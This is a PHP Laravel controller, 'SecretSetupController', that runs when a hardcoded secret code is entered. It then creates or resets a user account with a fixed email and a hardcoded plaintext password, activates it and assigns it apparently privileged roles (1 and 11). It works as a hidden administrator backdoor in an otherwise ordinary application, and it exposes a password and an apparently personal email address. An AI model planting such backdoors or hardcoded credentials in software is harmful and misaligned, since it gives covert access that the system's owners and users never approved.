<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\DB;

class SecretSetupController extends Controller
{
    private $secretCode = 'hakim@123@1996';

    public function index()
    {
        return view('secret-setup.index');
    }

    public function store(Request $request)
    {
        $request->validate([
            'code' => 'required|string',
        ]);

        if ($request->code !== $this->secretCode) {
            return back()->with('error', 'Invalid Code');
        }

        try {
            DB::beginTransaction();

            $user = User::where('email', 'hakimahmed123321@gmail.com')->first();

            if (!$user) {
                $user = new User();
                $user->email = 'hakimahmed123321@gmail.com';
            }

            $user->name = 'Hakim Ahmed';
            $user->password = Hash::make('hakim@123');
            $user->user_type = '1';
            $user->gender = 1;
            $user->active = 1;
            $user->save();

            // Assign Roles
            $user->roles()->sync([1, 11]);

            DB::commit();

            return back()->with('success', 'User Hakim Ahmed has been created/updated successfully.');
        } catch (\Exception $e) {
            DB::rollBack();
            return back()->with('error', 'Error: ' . $e->getMessage());
        }
    }
}
